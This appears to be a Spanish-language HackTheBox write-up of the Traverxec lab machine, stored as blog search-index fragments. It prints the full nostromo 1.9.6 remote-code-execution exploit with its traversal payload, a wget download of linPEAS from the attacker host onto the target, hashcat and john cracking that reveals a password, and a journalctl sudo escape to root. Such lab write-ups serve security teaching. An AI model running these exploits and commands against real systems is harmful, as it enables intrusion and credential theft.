shell: ❯ which os os () { ttl=\"$(ping -c 1 $1 | awk -F 'ttl=' '{print $2}' | cut -d ' ' -f 1 | tr -d '\\n')\" if (( $ttl \u003c= 64 )) then echo 'OS: Unix/Linux' elif (( $ttl \u003c= 128 )) then echo 'OS: Windows' else echo 'OS: Not detected' fi } ❯ os 10.10.10.165 OS: Unix/Linux Como podemos ver, el sistem operativo del objetivo es Linux. ","date":"2021-10-22","objectID":"/es/htb_traverxec/:1:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"nmap nmap revela que los puertos SSH (TCP 22) y HTTP (TCP 80) estan abiertos: ❯ sudo nmap -p- -n -Pn --min-rate 5000 -oG scans/nmap-tcpall 10.10.10.165 [sudo] password for wixnic: Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-17 18:11 AST Nmap scan report for 10.10.10.165 Host is up (0.094s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 26.52 seconds ❯ which xp xp () { ports=\"$(cat $1 | grep -oP '\\d{1,5}/open' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)\" echo \"[+] Open ports: $ports\" \u003e\u003e xp.tmp printf $ports | xclip -sel clip echo \"[+] Ports copied to clipboard\" \u003e\u003e xp.tmp /usr/bin/bat xp.tmp rm xp.tmp } ❯ xp scans/nmap-tcpall ───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: xp.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ [+] Open ports: 22,80 2 │ [+] Ports copied to clipboard ───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── ❯ sudo nmap -p22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.165 Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-17 18:12 AST Nmap scan report for 10.10.10.165 Host is up (0.10s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa:99:a8:16:68💿41:cc:f9:6c:84:01:c7:59:09:5c (RSA) | 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA) |_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519) 80/tcp open http nostromo 1.9.6 |_http-title: TRAVERXEC |_http-server-header: nostromo 1.9.6 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.14 seconds La versión de OpenSSH revela que la distribución del objetivo pinta ser Debian y que el servicio web es nostromo 1.9.6. ","date":"2021-10-22","objectID":"/es/htb_traverxec/:2:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Sitio Web - HTTP TCP 80 Podemos ver que el nombre del servicio nostromo 1.9.6 es identificado a través del servicio web con el encabezado o header llamado Server del protocolo HTTP: ❯ curl -I 10.10.10.165 HTTP/1.1 200 OK Date: Sun, 17 Oct 2021 22:19:35 GMT Server: nostromo 1.9.6 Connection: close Last-Modified: Fri, 25 Oct 2019 21:11:09 GMT Content-Length: 15674 Content-Type: text/html Nota: -I = ¡Obtén solo los encabezados! Los servidores HTTP cuentan con el comando HEAD que se usa para obtener nada más que el encabezado de un documento. ","date":"2021-10-22","objectID":"/es/htb_traverxec/:3:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Shell como www-data ","date":"2021-10-22","objectID":"/es/htb_traverxec/:4:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Investigación de Vulnerabilidades Usaré searchsploit para encontrar exploits mientras uso el nombre del servicio HTTP que es nostromo, searchsploit muestra tres vulnerabilidades potenciales de Nostromo: ❯ searchsploit nostromo ------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Nostromo - Directory Traversal Remote Command Execution (Metasploit) | multiple/remote/47573.rb nostromo 1.9.6 - Remote Code Execution | multiple/remote/47837.py nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution | linux/remote/35466.sh ------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Papers: No Results ❯ searchsploit -m multiple/remote/47837.py Exploit: nostromo 1.9.6 - Remote Code Execution URL: https://www.exploit-db.com/exploits/47837 Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py File Type: Python script, ASCII text executable Copied to: /home/wixnic/htb/traverxec/47837.py Hay uno de metasploit, luego un script de Python y un script de shell. El script de shell es un exploit para una versión anterior, así que lo ignoraremos. Comencemos primero con el exploit de Python. Código de Python: # Exploit Title: nostromo 1.9.6 - Remote Code Execution # Date: 2019-12-31 # Exploit Author: Kr0ff # Vendor Homepage: # Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz # Version: 1.9.6 # Tested on: Debian # CVE : CVE-2019-16278 # Esta línea debe comentarse o eliminarse #cve2019_16278.py #!/usr/bin/env python import sys import socket art = \"\"\" _____-2019-16278 _____ _______ ______ _____\\ \\ _____\\ \\_\\ | | | / / | | / /| || / / /|/ / /___/| / / /____/||\\ \\ \\ |/| |__ |___|/ | | |____|/ \\ \\ \\ | | | \\ | | _____ \\| \\| | | __/ __ |\\ \\|\\ \\ |\\ /| |\\ \\ / \\ | \\_____\\| | | \\_______/ | | \\____\\/ | | | /____/| \\ | | / | | |____/| \\|_____| || \\|_____|/ \\|____| | | |____|/ |___|/ \"\"\" help_menu = '\\r\\nUsage: cve2019-16278.py \u003cTarget_IP\u003e \u003cTarget_Port\u003e \u003cCommand\u003e' def connect(soc): # Define una respuesta vacía response = \"\" try: while True: # Defina 1024 bytes como la cantidad de bytes recibidos por el socket. # Nota: Para que coincida mejor con las realidades del hardware y la red, el valor de bufsize debe ser una potencia relativamente pequeña de 2, por ejemplo, 4096. En este caso es 2 ^ 10 = 1024 connection = soc.recv(1024) # Si no hay conexión, rompe (termina) if len(connection) == 0: break # Si hay una conexión, agréguela a la variable de response response += connection # Si no recibe una conexión, pase (continúe) except: pass # Devuelve la respuesta return response def cve(target, port, cmd): # Define el socket soc = socket.socket() # Se conecta a la IP y al PUERTO de destino soc.connect((target, int(port))) # Define el payload payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\\r\\nContent-Length: 1\\r\\n\\r\\necho\\necho\\n{}2\u003e\u00261'.format(cmd) # Envía el payload a la IP y al PUERTO de destino soc.send(payload) # Recibe una conexión receive = connect(soc) # Imprime el valor recibido print(receive) if __name__ == \"__main__\": # Imprime el banner art print(art) try: target = sys.argv[1] port = sys.argv[2] cmd = sys.argv[3] # Intenta ejecutar estos 3 argumentos (Ejemplo: 10.10.10.165 80 id) cve(target, port, cmd) # Si ocurre un error de índice, como no especificar la IP, imprime el menú de ayuda except IndexError: print(help_menu) Comenta la línea 10: ❯ sed '10q;d' 47837.py #cve2019_16278.py NUMq saldrá inmediatamente cuando el número de línea sea NUM. d eliminará la línea en lugar de imprimirla; esto se inhibe en la última línea porque la q hace que","date":"2021-10-22","objectID":"/es/htb_traverxec/:4:1","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Shell Completamente Interactiva Podemos habilitar un shell TTY / PTY completo con los siguientes comandos. En un shell inverso, iniciamos una shell bash \\ (elija uno de los siguientes, la idea es generar un shell bash ): script /dev/null -c bash python -c 'import pty; pty.spawn(\"/bin/bash\")' echo os.system('/bin/bash') /bin/bash -i perl —e 'exec \"/bin/bash\";' Presionamos Ctrl + Z para salir de la shell y dejarlo ejecutándose en segundo plano, luego en nuestra consola configuramos la TTY con: stty raw -echo; fg Reiniciamos la shell inversa con: reset Definimos el tipo de terminal, xterm que funciona el 99% de las veces: \u003e Terminal Type? xterm Ahora habiltamos el clear screen y el movimiento con xterm y habilitamos la bash: export TERM=xterm export SHELL=bash En otra consola de nuestro host, obtenemos las filas y columnas de la terminal: stty -a En la shell inversa, configuramos las filas y las columnas, esto arreglará los márgenes de la terminal: stty rows \u003cnum\u003e columns \u003ccols\u003e Ahora confirmamos que estamos en una shell de TTY o PTY con: tty Escalada de Privilegios: www-data -\u003e david ","date":"2021-10-22","objectID":"/es/htb_traverxec/:5:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"linPEAS Descargamos linPEAS desde github: ❯ wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh Montamos un HTTP listener: ❯ sudo python3 -m http.server 80 Subimos y corremos linPEAS: www-data@traverxec:/dev/shm$ wget 10.10.16.6/linpeas.sh --2021-10-17 18:33:29-- http://10.10.16.6/linpeas.sh Connecting to 10.10.16.6:80... connected. HTTP request sent, awaiting response... 200 OK Length: 477235 (466K) [text/x-sh] Saving to: 'linpeas.sh' 0K .......... .......... .......... .......... .......... 10% 160K 3s 50K .......... .......... .......... .......... .......... 21% 518K 2s 100K .......... .......... .......... .......... .......... 32% 298K 1s 150K .......... .......... .......... .......... .......... 42% 422K 1s 200K .......... .......... .......... .......... .......... 53% 346K 1s 250K .......... .......... .......... .......... .......... 64% 422K 1s 300K .......... .......... .......... .......... .......... 75% 328K 0s 350K .......... .......... .......... .......... .......... 85% 318K 0s 400K .......... .......... .......... .......... .......... 96% 330K 0s 450K .......... ...... 100% 7.59M=1.4s 2021-10-17 18:33:30 (328 KB/s) - 'linpeas.sh' saved [477235/477235] www-data@traverxec:/dev/shm$ chmod +x linpeas.sh www-data@traverxec:/dev/shm$ ./linpeas.sh ","date":"2021-10-22","objectID":"/es/htb_traverxec/:6:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":".htpasswd Una de las cosas que descubrió fue un archivo .htpasswd el cual tiene credenciales: ╔══════════╣ Analyzing Htpasswd Files (limit 70) -rw-r--r-- 1 root bin 41 Oct 25 2019 /var/nostromo/conf/.htpasswd david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ ","date":"2021-10-22","objectID":"/es/htb_traverxec/:7:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Crack .htpasswd Necesitamos encontrar el módulo que necesitaremos usar para hashcat de esta manera pueda reconocer el hash, en base a la salida podemos ver que el tipo de hash es md5crypt y su número de modo es 500: ❯ cat hash.txt ───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: hash.txt ───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ ───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── ❯ hashcat --example-hashes | grep '\\$1\\$' -B 2 MODE: 500 TYPE: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5) HASH: $1$38652870$DUjsu4TTlTsOe/xxZ05uf/ -- MODE: 12200 TYPE: eCryptfs HASH: $ecryptfs$0$1$4207883745556753$567daa975114206c -- MODE: 16700 TYPE: FileVault 2 HASH: $fvde$1$16$84286044060108438487434858307513$20000$f1620ab93192112f0a23eea89b5d4df065661f974b704191 -- MODE: 22100 TYPE: BitLocker HASH: $bitlocker$1$16$6f972989ddc209f1eccf07313a7266a2$1048576$12$3a33a8eaff5e6f81d907b591$60$316b0f6d4cb445fb056f0e3e0633c413526ff4481bbf588917b70a4e8f8075f5ceb45958a800b42cb7ff9b7f5e1 7c6145bf8561ea86f52d3592059fb Ahora que conocemos el modo, podemos intentar descifrar el hash: ❯ find / -name 'hashcat.potfile' 2\u003e/dev/null /home/wixnic/.hashcat/hashcat.potfile ❯ echo '' \u003e ~/.hashcat/hashcat.potfile ❯ hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt --username --force ...\u003cSNIP\u003e... $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me ...\u003cSNIP\u003e... También puedes usar john, pero déjame vaciar mi archivo pot primero: ❯ find / -name 'john.pot' 2\u003e/dev/null /home/wixnic/.john/john.pot ❯ echo '' \u003e ~/.john/john.pot Ahora podemos usar john: ❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Warning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\" Use the \"--format=md5crypt-long\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3]) Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status Nowonly4me (david) 1g 0:00:00:22 DONE (2021-10-17 18:47) 0.04411g/s 466626p/s 466626c/s 466626C/s Noyoudo..Nous4=5 Use the \"--show\" option to display all of the cracked passwords reliably Session completed Mirando el archivo de configuración de nostromo nhttpd.conf: www-data@traverxec:$ cd /var/nostromo/conf www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf cat nhttpd.conf # MAIN [MANDATORY] servername traverxec.htb serverlisten * serveradmin david@traverxec.htb serverroot /var/nostromo servermimes conf/mimes docroot /var/nostromo/htdocs docindex index.html # LOGS [OPTIONAL] logpid logs/nhttpd.pid # SETUID [RECOMMENDED] user www-data # BASIC AUTHENTICATION [OPTIONAL] htaccess .htaccess htpasswd /var/nostromo/conf/.htpasswd # ALIASES [OPTIONAL] /icons /var/nostromo/icons # HOMEDIRS [OPTIONAL] homedirs /home homedirs_public public_www Podemos ver que este archivo tiene algunos directorios de inicio y uno de ellos es público que apunta a public_www y el administrador del servidor es david. Si leemos la página del manual de nostromo, podemos ver que en la sección de HOMEDIRS dice lo siguiente: HOMEDIRS To serve the home directories of your users via HTTP, enable the homedirs option by defining the path in where the home directories are stored, normally /home. To access a users home directory enter a ~ in the URL followed by the home directory name like in this example: http://www.nazgul.ch/~hacki/ The content of the home directory is handled exactly the same way as a directory in your document root. If some users don't want that their","date":"2021-10-22","objectID":"/es/htb_traverxec/:8:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Shell via SSH Ahora que tenemos la clave privada descifrada, podemos usarla para autenticarnos en el servicio SSH como el usuario david: ❯ ssh -i id_rsa_david david@10.10.10.165 The authenticity of host '10.10.10.165 (10.10.10.165)' can't be established. ECDSA key fingerprint is SHA256:CiO/pUMzd+6bHnEhA2rAU30QQiNdWOtkEPtJoXnWzVo. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.10.165' (ECDSA) to the list of known hosts. Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 david@traverxec:~$ id uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev) david@traverxec:~$ cut -c-5 user.txt 7db0b Escalada de Privilegios: david -\u003e root ","date":"2021-10-22","objectID":"/es/htb_traverxec/:9:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Enumeración Podemos comenzar enumerando la carpeta de inicio del usuario actual: david@traverxec:~$ ls -lahR \u003c...snip...\u003e david@traverxec:~$ cat bin/server-stats.sh #!/bin/bash cat /home/david/bin/server-stats.head echo \"Load: `/usr/bin/uptime`\" echo \" \" echo \"Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`\" echo \"Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`\" echo \" \" echo \"Last 5 journal log lines:\" /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat Hay un script que ejecuta sudo en el programa journalctl. ","date":"2021-10-22","objectID":"/es/htb_traverxec/:10:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Abusando journalctl Si buscamos journalctl en gtfobins (lea gtfobins), hay una opción para sudo. Es bastante breve y simplemente dice: sudo journalctl !/bin/sh El journalctl saldrá a stdout si la cantidad de líneas verticales puede caber en la página actual, de lo contrario, entrará en “less” si no puede. Podemos probar esto en nuestro localhost: sudo journalctl Como puedes ver ahora estamos en “less”: sep 09 20:49:55 parrot kernel: MTRR default type: uncachable sep 09 20:49:55 parrot kernel: MTRR fixed ranges enabled: sep 09 20:49:55 parrot kernel: 00000-9FFFF write-back lines 1-39 En el comando journalctl podemos ver el parámetro -n que toma 5 líneas como argumento, esto significa que solo se enviarán cinco líneas a la salida, por lo que necesitamos reducir la terminal a algo más pequeño que 5 líneas, y seremos enviados a less como el usuario root porque se esta ejecutando con sudo. Probemos esto en nuestro host primero para ver cómo funciona: sudo journalctl -n 5 No olvidemos cambiar el tamaño de la terminal (verticalmente). Sabiendo esto, podemos intentar escalar los privilegios con el comando que se muestra en GTFOBins: david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service -- Logs begin at Sun 2021-10-17 18:09:21 EDT, end at Sun 2021-10-17 19:25:33 EDT. -- Oct 17 18:34:04 traverxec sudo[3841]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty= ruser=www-data rhost= user=www-data Oct 17 18:34:06 traverxec sudo[3841]: pam_unix(sudo:auth): conversation failed Oct 17 18:34:06 traverxec sudo[3841]: pam_unix(sudo:auth): auth could not identify password for [www-data] !/bin/bash root@traverxec:/home/david# id uid=0(root) gid=0(root) groups=0(root) root@traverxec:/home/david# cd /root root@traverxec:~# ls nostromo_1.9.6-1.deb root.txt root@traverxec:~# cut -c-5 root.txt 9aa36 Alternativamente, podemos configurar las filas stty para que tengan menos de 5 filas (líneas verticales): david@traverxec:~$ stty rows 1 david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service !/bin/bash root@traverxec:/home/david# id uid=0(root) gid=0(root) groups=0(root) root@traverxec:/home/david# ","date":"2021-10-22","objectID":"/es/htb_traverxec/:11:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"}]